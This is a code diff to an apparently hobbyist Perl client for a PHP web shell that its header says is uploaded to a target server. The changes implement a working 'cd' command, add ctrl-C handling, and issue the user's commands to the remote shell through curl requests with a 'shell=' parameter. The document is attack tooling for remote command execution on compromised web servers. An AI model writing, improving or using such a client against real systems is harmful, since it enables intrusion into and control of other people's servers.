@@ -7,14 +7,14 @@
 # progress. Enjoy it!                                    #
 ##########################################################
 # Todos:                    #   Limitations/Bugs:        #
-# - URL encode EVERYTHING   #   - cd does nothing        #
-# - Make a working cd cmd   #   - ctrl-c resets prompt   #
+# - URL encode EVERYTHING   #   - ctrl-c resets prompt   #
 # - separate commands by ;  #     the first time but not #
 #   and have them run       #     after that             #
 #   separately (split?)     #                            #
 # - Fix ctrl-C              #                            #
 # - remove global vars      #                            #
 # - clean up code, always   #                            #
+# - Base64 encode URL       #                            #
 ##########################################################
 # Here is the simple shell to upload to the target	 #
 # <?php                                                  #
@@ -41,15 +41,23 @@ $SIG{INT} = \&ctrlc; #defines control-C action
 # nicer output.            #
 ############################
 sub StripTags{
-	if (defined($_[1]) == 1){
+	if (defined($_[1])){
 		$_[0] =~ s/<br>/\n/g;
 	}
 	$_[0] =~ s/<\w+>|<\/\w+>//g;
 }
 
+############################
+# A janky way to do cd...  #
+# cd's to the previous dir #
+# runs the full command    #
+# and then figures out the #
+# pwd (dir after command   #
+#   HEY IT WORKS OKAY?!?   #
+############################
 sub cd{
 	my $input = $_[0];
-	$pwd = `curl -s $loc?shell=$input%3Bpwd | tail -1`;
+	$pwd = `curl -s $loc?shell=cd%20$pwd%3B$input%3Bpwd | tail -1`;
 	StripTags($pwd);
 	$pwd =~ s/^\s+|\s+$//g;	
 }
@@ -64,7 +72,7 @@ sub URLEncode{
 # to the shell.            #
 ############################
 sub ctrlc{
-	`killall curl`;
+	`killall curl &>/dev/null`;
 	print "\n";
 	shell();
 }
@@ -83,7 +91,7 @@ sub shell{
 	if ($input eq "quit" || $input eq "exit"){
 		exit;
 	}
-	if ($input =~ m/cd%20\S+/){ #not implemented yet
+	if ($input =~ m/cd%20\S+/){
 		cd($input);
 	}
 
